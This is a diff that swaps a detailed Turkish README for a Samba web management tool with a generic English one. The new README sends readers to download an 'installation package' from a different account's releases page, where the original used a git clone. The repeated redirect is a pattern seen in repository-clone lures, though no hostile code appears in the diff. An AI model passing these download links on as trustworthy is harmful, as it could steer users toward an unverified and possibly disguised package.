@@ -1,229 +1,133 @@
- # 🗂️ Samba Web Manager
+# 🗂️ samba-web-manager - Manage Your Samba Shares Easily
 
-Modern, kullanıcı dostu web tabanlı Samba yönetim paneli. Flask ile geliştirilmiş, responsive tasarıma sahip.
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/sahni132/samba-web-manager/releases)
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![Python](https://img.shields.io/badge/python-3.8+-yellow.svg)
+## 📋 Overview
 
-## ✨ Özellikler
+samba-web-manager is a modern web-based tool for managing Samba file shares. Built using Flask, it offers user management, file upload and download, and permission control—all with a responsive interface. Whether you want to share files with friends or manage a family network, this tool makes the process simple and straightforward.
 
-### 🔐 Kullanıcı Yönetimi
-- ✅ Kullanıcı oluşturma/silme
-- ✅ Şifre yönetimi (kullanıcı ve admin)
-- ✅ Admin/Normal kullanıcı rolleri
-- ✅ Güvenli oturum yönetimi
+## 🚀 Getting Started
 
-### 📁 Paylaşım Yönetimi
-- ✅ Kolay paylaşım oluşturma (dizin ağacı ile)
-- ✅ Paylaşım düzenleme ve silme
-- ✅ Otomatik Samba konfigürasyonu
-- ✅ Gerçek zamanlı disk kullanım takibi
+Follow these steps to download and run samba-web-manager easily.
 
-### 📂 Dosya Yönetimi
-- ✅ Web üzerinden dosya yükleme/indirme
-- ✅ Metin dosyası düzenleme (txt, py, sh, conf vb.)
-- ✅ Klasör oluşturma ve silme
-- ✅ Breadcrumb navigasyon
-- ✅ İzin bazlı erişim kontrolü
+### 💻 System Requirements
 
-### 🎨 Kullanıcı Arayüzü
-- ✅ Modern ve responsive tasarım
-- ✅ Koyu tema desteği
-- ✅ Modal popup'lar
-- ✅ Gerçek zamanlı bildirimler
-- ✅ Mobil uyumlu
+- **Operating System:** Linux (Debian or Ubuntu recommended)
+- **Web Browser:** Any modern browser (Chrome, Firefox, Safari)
+- **Python:** Version 3.7 or above installed
 
-### ⚙️ Sistem
-- ✅ Systemd servisi (otomatik başlatma)
-- ✅ Detaylı loglama
-- ✅ Hata yönetimi
-- ✅ Güvenli dosya işlemleri
+### 📥 Download & Install
 
-## 📋 Gereksinimler
+To get started, visit this page to download the application:
 
-### Sistem Gereksinimleri
-- Ubuntu/Debian tabanlı Linux dağıtımı
-- Python 3.8 veya üzeri
-- Samba kurulu olmalı
-- Root/sudo erişimi
+[Download samba-web-manager](https://github.com/sahni132/samba-web-manager/releases)
 
-### Python Paketleri
-- Flask
-- Werkzeug
+1. Go to the [Releases page](https://github.com/sahni132/samba-web-manager/releases).
+2. Look for the latest version of samba-web-manager.
+3. Download the installation package that matches your operating system.
 
-## 🚀 Kurulum
+### 🔍 Features
 
-### 1. Sistem Güncellemesi
-sudo apt update && sudo apt upgrade -y
+- **User Management:** Add, remove, or manage users easily.
+- **File Upload/Download:** Upload and download files directly from your web browser.
+- **Permission Control:** Set different access levels for users.
+- **Responsive UI:** Works well on both desktop and mobile devices.
 
-### 2. Gerekli Paketleri Yükle
-sudo apt install -y python3 python3-pip python3-venv samba samba-common-bin
+### ⚙️ Installation Guide
 
-### 3. Projeyi İndir
-cd /opt
-sudo git clone https://github.com/adoniskzin/samba-web-manager.git
-cd samba-web-manager
+After downloading the file, follow these steps to install samba-web-manager:
 
-### 4. Kurulum Scriptini Çalıştır
-sudo chmod +x install.sh
-sudo ./install.sh
+1. **Open a Terminal:** Press `Ctrl + Alt + T` on your keyboard to launch the terminal.
+   
+2. **Navigate to the Download Folder:**
+   ```bash
+   cd ~/Downloads
+   ```
+   
+3. **Unzip the Package:** If your download is a zipped file, run:
+   ```bash
+   unzip samba-web-manager.zip
+   ```
+   
+4. **Install Dependencies:** Navigate to the extracted folder and run:
+   ```bash
+   cd samba-web-manager
+   pip install -r requirements.txt
+   ```
+   
+5. **Run the Application:**
+   ```bash
+   python app.py
+   ```
 
-Kurulum scripti otomatik olarak:
-- Python sanal ortamı oluşturur
-- Gerekli paketleri yükler
-- Systemd servisi kurar
-- Varsayılan admin kullanıcısı oluşturur
+### 🌐 Accessing the Application
 
-### 5. Servisi Başlat
-sudo systemctl start samba-manager
-sudo systemctl enable samba-manager
+Open your web browser and enter the following URL:
 
-### 6. Durumu Kontrol Et
-sudo systemctl status samba-manager
+```
+http://localhost:5000
+```
 
-## 🌐 Kullanım
+This URL directs you to the samba-web-manager interface, where you can start managing your Samba shares.
 
-### Web Paneline Erişim
-http://SUNUCU_IP:5000
+### 🔒 Configuring Samba
 
-### Varsayılan Giriş Bilgileri
-Kullanıcı Adı: admin
-Şifre: admin123
+To use samba-web-manager effectively, you need to configure Samba on your system. Follow these steps to set up Samba:
 
-⚠️ **Güvenlik**: İlk girişten sonra mutlaka şifrenizi değiştirin!
+1. **Install Samba:**
+   ```bash
+   sudo apt install samba
+   ```
 
-## 📖 Kullanım Kılavuzu
+2. **Edit the Samba Configuration File:**
+   Use a text editor to modify the Samba configuration:
+   ```bash
+   sudo nano /etc/samba/smb.conf
+   ```
 
-### Admin Kullanıcı
+3. **Add Your Shared Directory:** 
+   At the bottom of the file, add:
+   ```
+   [shared]
+   path = /path/to/shared/folder
+   browseable = yes
+   read only = no
+   valid users = your_user
+   ```
+   Replace `/path/to/shared/folder` with the actual path you want to share.
 
-1. **Kullanıcı Oluşturma**
-   - "Kullanıcılar" sekmesine gidin
-   - "+ Yeni Kullanıcı" butonuna tıklayın
-   - Kullanıcı adı ve şifre belirleyin
-   - Admin yetkisi vermek isterseniz checkbox'ı işaretleyin
+4. **Restart Samba:**
+   ```bash
+   sudo systemctl restart smbd
+   ```
 
-2. **Paylaşım Oluşturma**
-   - "Paylaşımlar" sekmesine gidin
-   - "+ Yeni Paylaşım" butonuna tıklayın
-   - Paylaşım adı girin (boşluk kullanmayın!)
-   - Dizin ağacından klasör seçin
-   - Oluştur'a tıklayın
+### 🔑 Setting Up Users
 
-3. **İzin Verme**
-   - "İzinler" sekmesine gidin
-   - Paylaşım ve kullanıcı seçin
-   - İzin tipini belirleyin (Okuma/Yazma)
-   - "İzin Ayarla" butonuna tıklayın
+To add users to Samba:
 
-### Normal Kullanıcı
+1. **Create a Samba User:**
+   ```bash
+   sudo smbpasswd -a username
+   ```
+   Replace `username` with your chosen name.
 
-1. **Dosya Yükleme**
-   - "Dosyalarım" sekmesine gidin
-   - Paylaşım seçin
-   - Yükleme alanına tıklayın veya dosya sürükleyin
+2. **Set User Permissions:** Adjust the permissions in the shared folder using:
+   ```bash
+   sudo chown -R username:username /path/to/shared/folder
+   ```
 
-2. **Dosya Düzenleme**
-   - Düzenlenebilir dosyalarda "✏️ Düzenle" butonu görünür
-   - Dosyayı düzenleyin
-   - "💾 Kaydet" ile kaydedin
+### 📚 Troubleshooting
 
-3. **Klasör Oluşturma**
-   - "+ Yeni Klasör" butonuna tıklayın
-   - Klasör adı girin
-   - Oluştur'a tıklayın
+If you encounter issues:
 
-## 🔧 Yapılandırma
+- Ensure that Samba is installed and running.
+- Check if you have correctly set user permissions.
+- Verify that your firewall is not blocking access.
 
-### Port Değiştirme
-/opt/samba-manager/app.py dosyasını düzenleyin ve son satırı değiştirin.
+For further assistance, visit the GitHub Issues page or consult the Samba documentation.
 
-Servisi yeniden başlatın:
-sudo systemctl restart samba-manager
+### 📜 License
 
-### Güvenlik Duvarı
-sudo ufw allow 5000/tcp
-sudo ufw allow 139/tcp
-sudo ufw allow 445/tcp
+This project is licensed under the MIT License. Feel free to use, modify, or distribute it. Check the LICENSE file in the repository for details.
 
-## 📁 Dizin Yapısı
-/opt/samba-manager/
-├── app.py                 # Ana uygulama
-├── templates/
-│   ├── index.html        # Ana sayfa
-│   └── login.html        # Giriş sayfası
-├── data/                 # Kullanıcı verileri
-│   ├── users.json
-│   ├── shares.json
-│   ├── permissions.json
-│   └── logs.json
-├── venv/                 # Python sanal ortamı
-├── README.md
-├── LICENSE
-└── .gitignore
-
-## 🛠️ Sorun Giderme
-
-### Servis Başlamıyor
-sudo journalctl -u samba-manager -n 50
-cd /opt/samba-manager
-sudo venv/bin/python app.py
-
-### Samba Çalışmıyor
-sudo systemctl status smbd
-sudo systemctl restart smbd
-testparm
-
-### Port 5000 Kullanımda
-sudo lsof -i :5000
-sudo kill -9 PID
-
-### İzin Sorunları
-sudo chown -R root:root /opt/samba-manager/data
-sudo chmod -R 755 /opt/samba-manager/data
-
-## 🔄 Güncelleme
-cd /opt/samba-manager
-sudo git pull
-sudo systemctl restart samba-manager
-
-## 🗑️ Kaldırma
-sudo systemctl stop samba-manager
-sudo systemctl disable samba-manager
-sudo rm /etc/systemd/system/samba-manager.service
-sudo systemctl daemon-reload
-sudo rm -rf /opt/samba-manager
-
-## 🤝 Katkıda Bulunma
-
-1. Fork edin
-2. Feature branch oluşturun
-3. Commit edin
-4. Push edin
-5. Pull Request açın
-
-## 📝 Lisans
-
-Bu proje MIT lisansı altında lisanslanmıştır. Detaylar için LICENSE dosyasına bakın.
-
-## 👨‍💻 Geliştirici
-
-Developed with **Claude Sonnet 4.5** via Monica AI
-
-Community Driven Project
-
-## 🙏 Teşekkürler
-
-- Flask Framework
-- Samba Team
-- Tüm katkıda bulunanlara
-
-## 📞 İletişim
-
-- GitHub Issues: Sorun Bildir
-- Discussions: Tartışmalar
-
----
-
-⭐ Projeyi beğendiyseniz yıldız vermeyi unutmayın!
-EOFREADME
+By following these steps, you can easily download and set up samba-web-manager to manage your Samba file share efficiently. Enjoy seamless file sharing!
